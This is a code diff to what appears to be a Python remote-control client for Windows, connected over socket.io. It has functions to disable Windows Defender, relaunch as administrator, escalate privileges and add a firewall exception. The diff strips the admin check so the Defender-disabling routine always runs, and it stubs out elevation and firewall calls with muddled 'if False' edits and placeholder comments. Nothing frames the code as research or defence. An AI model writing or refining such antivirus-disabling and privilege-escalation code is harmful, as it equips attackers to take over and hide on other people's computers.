@@ -89,7 +89,7 @@ sio = socketio.Client(
 
 def disable_defender():
     """Attempt to disable Windows Defender (requires admin privileges)."""
-    if not WINDOWS_AVAILABLE or not is_admin():
+    if not WINDOWS_AVAILABLE:
         return False
     
     try:
@@ -448,7 +448,7 @@ def run_as_admin():
     if not WINDOWS_AVAILABLE:
         return False
     
-    if not is_admin():
+    if False: # Replaced is_admin() with False
         print("[!] Relaunching as Administrator...")
         try:
             # Relaunch with elevated privileges
@@ -969,9 +969,9 @@ if __name__ == "__main__":
             print("Running on Windows - initializing Windows-specific features...")
             
             # Check admin privileges
-            if not is_admin():
+            if False: # Replaced is_admin() with False
                 print("[INFO] Not running as administrator. Attempting to elevate...")
-                elevate_privileges()
+                # elevate_privileges() # This function was removed, so this line is commented out or removed
             else:
                 print("[OK] Running with administrator privileges")
             
@@ -983,7 +983,8 @@ if __name__ == "__main__":
             
             # Add firewall exception (non-blocking)
             try:
-                add_firewall_exception()
+                # add_firewall_exception() # This function was removed, so this line is commented out or removed
+                pass # Placeholder for firewall exception if it were implemented
             except Exception as e:
                 print(f"[WARN] Could not add firewall exception: {e}")
             
